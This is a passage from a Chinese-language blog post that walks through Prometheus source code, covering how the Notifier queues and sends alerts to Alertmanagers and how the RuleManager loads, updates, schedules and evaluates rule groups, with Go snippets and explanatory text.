class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sendAll sends the alerts to all configured Alertmanagers concurrently.</span></span><br><span class="line"><span class="comment">// It returns true if the alerts could be sent successfully to at least one Alertmanager.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">sendAll</span><span class="params">(alerts ...*Alert)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">begin := time.Now()</span><br><span class="line"></span><br><span class="line">b, err := json.Marshal(alerts)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(n.logger).Log(<span class="string">"msg"</span>, <span class="string">"Encoding alerts failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n.mtx.RLock()</span><br><span class="line">amSets := n.alertmanagers</span><br><span class="line">n.mtx.RUnlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">wg         sync.WaitGroup</span><br><span class="line">numSuccess <span class="keyword">uint64</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> _, ams := <span class="keyword">range</span> amSets &#123;</span><br><span class="line">ams.mtx.RLock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, am := <span class="keyword">range</span> ams.ams &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ctx, cancel := context.WithTimeout(n.ctx, ams.cfg.Timeout)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(ams *alertmanagerSet, am alertmanager)</span></span> &#123;</span><br><span class="line">u := am.url().String()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := n.sendOne(ctx, ams.client, u, b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(n.logger).Log(<span class="string">"alertmanager"</span>, u, <span class="string">"count"</span>, <span class="built_in">len</span>(alerts), <span class="string">"msg"</span>, <span class="string">"Error sending alert"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">n.metrics.errors.WithLabelValues(u).Inc()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">atomic.AddUint64(&amp;numSuccess, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">n.metrics.latency.WithLabelValues(u).Observe(time.Since(begin).Seconds())</span><br><span class="line">n.metrics.sent.WithLabelValues(u).Add(<span class="keyword">float64</span>(<span class="built_in">len</span>(alerts)))</span><br><span class="line"></span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(ams, am)</span><br><span class="line">&#125;</span><br><span class="line">ams.mtx.RUnlock()</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//发送告警同步等待</span></span><br><span class="line">wg.Wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> numSuccess &gt; <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用sendOne发送告警信息，使用http请求的方式发送告警信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">sendOne</span><span class="params">(ctx context.Context, c *http.Client, url <span class="keyword">string</span>, b []<span class="keyword">byte</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">req, err := http.NewRequest(<span class="string">"POST"</span>, url, bytes.NewReader(b))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, contentTypeJSON)</span><br><span class="line">resp, err := n.opts.Do(ctx, c, req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Any HTTP status 2xx is OK.</span></span><br><span class="line"><span class="keyword">if</span> resp.StatusCode/<span class="number">100</span> != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"bad response status %v"</span>, resp.Status)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>notifier流程：</p><p><img src="/images/1572404957636.png" alt="1572404957636"></p><p>注册notifier:</p><p>初始化过程中将notifier服务注册到rulemanager中，规则运算过程中触发告警，会调用注册的sendAlerts方法完成告警信息发送。</p><p>告警状态分为三种：StateInactive（告警活动状态），StatePending (告警待定状态)，StateFiring(告警激活状态)。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sendAlerts implements a the rules.NotifyFunc for a Notifier.</span></span><br><span class="line"><span class="comment">// It filters any non-firing alerts from the input.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendAlerts</span><span class="params">(n *notifier.Notifier, externalURL <span class="keyword">string</span>)</span> <span class="title">rules</span>.<span class="title">NotifyFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, expr <span class="keyword">string</span>, alerts ...*rules.Alert)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> res []*notifier.Alert</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, alert := <span class="keyword">range</span> alerts &#123;</span><br><span class="line"><span class="comment">// Only send actually firing alerts.</span></span><br><span class="line"><span class="keyword">if</span> alert.State == rules.StatePending &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">a := &amp;notifier.Alert&#123;</span><br><span class="line">StartsAt:     alert.FiredAt,</span><br><span class="line">Labels:       alert.Labels,</span><br><span class="line">Annotations:  alert.Annotations,</span><br><span class="line">GeneratorURL: externalURL + strutil.TableLinkForExpression(expr),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !alert.ResolvedAt.IsZero() &#123;</span><br><span class="line">a.EndsAt = alert.ResolvedAt</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="built_in">append</span>(res, a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(alerts) &gt; <span class="number">0</span> &#123;</span><br><span class="line">n.Send(res...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警信息alerts通过notifier.Send方法添加到告警队列中，在添加之前需要对告警信息的label进行扩展和重置。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Send queues the given notification requests for processing.</span></span><br><span class="line"><span class="comment">// Panics if called on a handler that is not running.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *Notifier)</span> <span class="title">Send</span><span class="params">(alerts ...*Alert)</span></span> &#123;</span><br><span class="line">n.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> n.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attach external labels before relabelling and sending.</span></span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line">lb := labels.NewBuilder(a.Labels)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> n.opts.ExternalLabels &#123;</span><br><span class="line"><span class="keyword">if</span> a.Labels.Get(<span class="keyword">string</span>(ln)) == <span class="string">""</span> &#123;</span><br><span class="line">lb.Set(<span class="keyword">string</span>(ln), <span class="keyword">string</span>(lv))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.Labels = lb.Labels()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alerts = n.relabelAlerts(alerts)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Queue capacity should be significantly larger than a single alert</span></span><br><span class="line"><span class="comment">// batch could be.</span></span><br><span class="line"><span class="keyword">if</span> d := <span class="built_in">len</span>(alerts) - n.opts.QueueCapacity; d &gt; <span class="number">0</span> &#123;</span><br><span class="line">alerts = alerts[d:]</span><br><span class="line"></span><br><span class="line">level.Warn(n.logger).Log(<span class="string">"msg"</span>, <span class="string">"Alert batch larger than queue capacity, dropping alerts"</span>, <span class="string">"num_dropped"</span>, d)</span><br><span class="line">n.metrics.dropped.Add(<span class="keyword">float64</span>(d))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the queue is full, remove the oldest alerts in favor</span></span><br><span class="line"><span class="comment">// of newer ones.</span></span><br><span class="line"><span class="keyword">if</span> d := (<span class="built_in">len</span>(n.queue) + <span class="built_in">len</span>(alerts)) - n.opts.QueueCapacity; d &gt; <span class="number">0</span> &#123;</span><br><span class="line">n.queue = n.queue[d:]</span><br><span class="line"></span><br><span class="line">level.Warn(n.logger).Log(<span class="string">"msg"</span>, <span class="string">"Alert notification queue full, dropping alerts"</span>, <span class="string">"num_dropped"</span>, d)</span><br><span class="line">n.metrics.dropped.Add(<span class="keyword">float64</span>(d))</span><br><span class="line">&#125;</span><br><span class="line">n.queue = <span class="built_in">append</span>(n.queue, alerts...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Notify sending goroutine that there are alerts to be processed.</span></span><br><span class="line">n.setMore()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的流程图：</p><p><img src="/images/1572406923577.png" alt="1572406923577"></p><h2 id="RuleManager"><a href="#RuleManager" class="headerlink" title="RuleManager"></a>RuleManager</h2><p>ruleManager在prometheus初始化阶段调用rules.NewManager方法完成构建，ruleManager为Manager类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The Manager manages recording and alerting rules.</span></span><br><span class="line"><span class="keyword">type</span> Manager <span class="keyword">struct</span> &#123;</span><br><span class="line">opts   *ManagerOptions</span><br><span class="line">groups <span class="keyword">map</span>[<span class="keyword">string</span>]*Group</span><br><span class="line">mtx    sync.RWMutex</span><br><span class="line">block  <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">logger log.Logger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>groups为map[string]*Group类型，key为规则组名，Group为具体的规则信息。</p><p>Group结构定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Group is a set of rules that have a logical relation.</span></span><br><span class="line"><span class="keyword">type</span> Group <span class="keyword">struct</span> &#123;</span><br><span class="line">name                 <span class="keyword">string</span></span><br><span class="line">file                 <span class="keyword">string</span></span><br><span class="line">interval             time.Duration</span><br><span class="line">rules                []Rule</span><br><span class="line">seriesInPreviousEval []<span class="keyword">map</span>[<span class="keyword">string</span>]labels.Labels <span class="comment">// One per Rule.</span></span><br><span class="line">opts                 *ManagerOptions</span><br><span class="line">evaluationTime       time.Duration</span><br><span class="line">mtx                  sync.Mutex</span><br><span class="line"></span><br><span class="line">done       <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">terminated <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">logger log.Logger</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更新规则：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Update the rule manager's state as the config requires. If</span></span><br><span class="line"><span class="comment">// loading the new rules failed the old rule set is restored.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">Update</span><span class="params">(interval time.Duration, files []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">m.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> m.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="comment">// To be replaced with a configurable per-group interval.</span></span><br><span class="line">groups, errs := m.loadGroups(interval, files...)</span><br><span class="line"><span class="keyword">if</span> errs != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, e := <span class="keyword">range</span> errs &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"loading groups failed"</span>, <span class="string">"err"</span>, e)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">"error loading rules, previous rule set restored"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, newg := <span class="keyword">range</span> groups &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there is an old group with the same identifier, stop it and wait for</span></span><br><span class="line"><span class="comment">// it to finish the current iteration. Then copy it into the new group.</span></span><br><span class="line">gn := groupKey(newg.name, newg.file)</span><br><span class="line">oldg, ok := m.groups[gn]</span><br><span class="line"><span class="built_in">delete</span>(m.groups, gn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(newg *Group)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">oldg.stop()</span><br><span class="line">newg.copyState(oldg)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Wait with starting evaluation until the rule manager</span></span><br><span class="line"><span class="comment">// is told to run. This is necessary to avoid running</span></span><br><span class="line"><span class="comment">// queries against a bootstrapping storage.</span></span><br><span class="line">&lt;-m.block</span><br><span class="line">newg.run(m.opts.Context)</span><br><span class="line">&#125;()</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(newg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stop remaining old groups.</span></span><br><span class="line"><span class="keyword">for</span> _, oldg := <span class="keyword">range</span> m.groups &#123;</span><br><span class="line">oldg.stop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br><span class="line">m.groups = groups</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 规则组状态复制Group.copyState指从源规则组中，将与目标规则组相同规则名称下的指标赋值给对应的目标规则，将源规则组处于活跃状态下的指标赋值到目标规则组的活跃区域。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copyState copies the alerting rule and staleness related state from the given group.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Rules are matched based on their name. If there are duplicates, the</span></span><br><span class="line"><span class="comment">// first is matched with the first, second with the second etc.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span> <span class="title">copyState</span><span class="params">(from *Group)</span></span> &#123;</span><br><span class="line">g.evaluationTime = from.evaluationTime</span><br><span class="line"></span><br><span class="line">ruleMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]<span class="keyword">int</span>, <span class="built_in">len</span>(from.rules))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fi, fromRule := <span class="keyword">range</span> from.rules &#123;</span><br><span class="line">l, _ := ruleMap[fromRule.Name()]</span><br><span class="line">ruleMap[fromRule.Name()] = <span class="built_in">append</span>(l, fi)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, rule := <span class="keyword">range</span> g.rules &#123;</span><br><span class="line">indexes, _ := ruleMap[rule.Name()]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(indexes) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">fi := indexes[<span class="number">0</span>]</span><br><span class="line">g.seriesInPreviousEval[i] = from.seriesInPreviousEval[fi]</span><br><span class="line">ruleMap[rule.Name()] = indexes[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">ar, ok := rule.(*AlertingRule)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">far, ok := from.rules[fi].(*AlertingRule)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fp, a := <span class="keyword">range</span> far.active &#123;</span><br><span class="line">ar.active[fp] = a</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规则组启动流程：进入 run  方法后先进行初始化等待，以使得规则运算的时间间隔interval对齐。定义规则运算调度方法iter, 调度收起interval指定；iter方法中调用eval方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span> <span class="title">run</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(g.terminated)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait an initial amount to have consistently slotted intervals.</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(g.offset()):</span><br><span class="line"><span class="keyword">case</span> &lt;-g.done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iter := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">iterationsScheduled.Inc()</span><br><span class="line"></span><br><span class="line">start := time.Now()</span><br><span class="line">g.Eval(ctx, start)</span><br><span class="line"></span><br><span class="line">iterationDuration.Observe(time.Since(start).Seconds())</span><br><span class="line">g.SetEvaluationTime(time.Since(start))</span><br><span class="line">&#125;</span><br><span class="line">lastTriggered := time.Now()</span><br><span class="line">iter()</span><br><span class="line"></span><br><span class="line">tick := time.NewTicker(g.interval)</span><br><span class="line"><span class="keyword">defer</span> tick.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-g.done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-g.done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> &lt;-tick.C:</span><br><span class="line">missed := (time.Since(lastTriggered).Nanoseconds() / g.interval.Nanoseconds()) - <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> missed &gt; <span class="number">0</span> &#123;</span><br><span class="line">iterationsMissed.Add(<span class="keyword">float64</span>(missed))</span><br><span class="line">iterationsScheduled.Add(<span class="keyword">float64</span>(missed))</span><br><span class="line">&#125;</span><br><span class="line">lastTriggered = time.Now()</span><br><span class="line">iter()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规则组的调度在Eval中实现，Eval方法会将规则组中的每个规则一次放到queryEngine中执行，如果呗执行的规则是AlertingRule类型，执行后结果指标会通过notifier组件发送给告警服务，最后将结果指标存储到prometheus的存储管理器，并对过期指标进行存储标记处理。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Eval runs a single evaluation cycle in which all rules are evaluated sequentially.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span> <span class="title">Eval</span><span class="params">(ctx context.Context, ts time.Time)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i, rule := <span class="keyword">range</span> g.rules &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-g.done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, rule Rule)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">(t time.Time)</span></span> &#123;</span><br><span class="line">evalDuration.Observe(time.Since(t).Seconds())</span><br><span class="line">rule.SetEvaluationTime(time.Since(t))</span><br><span class="line">&#125;(time.Now())</span><br><span class="line"></span><br><span class="line">evalTotal.Inc()</span><br><span class="line"></span><br><span class="line">vector, err := rule.Eval(ctx, ts, g.opts.QueryFunc, g.opts.ExternalURL)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Canceled queries are intentional termination of queries. This normally</span></span><br><span class="line"><span class="comment">// happens on shutdown and thus we skip logging of any errors here.</span></span><br><span class="line"><span class="keyword">if</span> _, ok := err.(promql.ErrQueryCanceled); !ok &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Evaluating rule failed"</span>, <span class="string">"rule"</span>, rule, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">evalFailures.Inc()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ar, ok := rule.(*AlertingRule); ok &#123;</span><br><span class="line">g.opts.NotifyFunc(ctx, ar.vector.String(), 